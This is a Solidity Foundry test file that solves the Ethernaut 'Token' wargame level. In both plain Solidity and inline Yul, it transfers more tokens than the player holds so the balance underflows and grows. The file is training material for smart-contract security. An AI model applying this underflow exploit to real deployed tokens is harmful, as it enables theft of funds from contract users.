// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { console } from "forge-std/console.sol";
import { EthernautTest } from "./EthernautTest.sol";

contract TokenTest is EthernautTest {
    function setUp() public override {
        super.setUp();
    }

    // just a test: get value from private mapping
    function getBalance(address token, address user) internal view returns (uint256) {
        return uint256(vm.load(address(token), keccak256(abi.encode(user, 0))));
    }

    // check the keccak256 hash of a function with multiple parameters
    function testSelector() public {
        console.logBytes4(Token.transfer.selector);
        console.logBytes4(bytes4(keccak256(abi.encodePacked("transfer(address, uint)"))));
        console.logBytes4(bytes4(keccak256(abi.encodePacked("transfer(address, uint256)"))));
        console.logBytes4(bytes4(keccak256(abi.encodePacked("transfer(address,uint)"))));
        console.logBytes4(bytes4(keccak256(abi.encodePacked("transfer(address,uint256)")))); // <--- This is the correct one
    }

    function testToken() public {
        Token token = Token(createLevelInstance(0xB4802b28895ec64406e45dB504149bfE79A38A57));

        console.log(token.balanceOf(player));
        token.transfer(address(0), 21);
        require(token.balanceOf(player) > 20);
        console.log(token.balanceOf(player));
    }

    function testTokenYul() public {
        Token token = Token(createLevelInstance(0xB4802b28895ec64406e45dB504149bfE79A38A57));

        assembly {
            // startBalance
            mstore(0, "balanceOf(address)")
            mstore(0, keccak256(0, 18))
            mstore(0x4, sload(player.slot))
            pop(staticcall(gas(), token, 0, 0x24, 0, 0x20)) // we don't check that the call succedeed
            let startBalance := mload(0)

            // here we are going to need more that 2 slots to store the args
            // so if we store at 0, we would override the free memory pointer
            let ptr := mload(0x40)
            mstore(ptr, "transfer(address,uint256)")
            mstore(ptr, keccak256(ptr, 25))
            mstore(add(ptr, 0x24), add(startBalance, 1))
            let success := call(gas(), token, 0, ptr, 0x44, 0, 0x20)
            if iszero(success) {
                revert(0, 0)
            }

            // endBalance
            mstore(0, "balanceOf(address)")
            mstore(0, keccak256(0, 18))
            mstore(0x4, sload(player.slot))
            pop(staticcall(gas(), token, 0, 0x24, 0, 0x20))
            let endBalance := mload(0)

            if iszero(gt(endBalance, startBalance)) {
                revert(0, 0)
            }
        }
    }
}

interface Token {
    function totalSupply() external view returns (uint);

    function transfer(address _to, uint _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint balance);
}
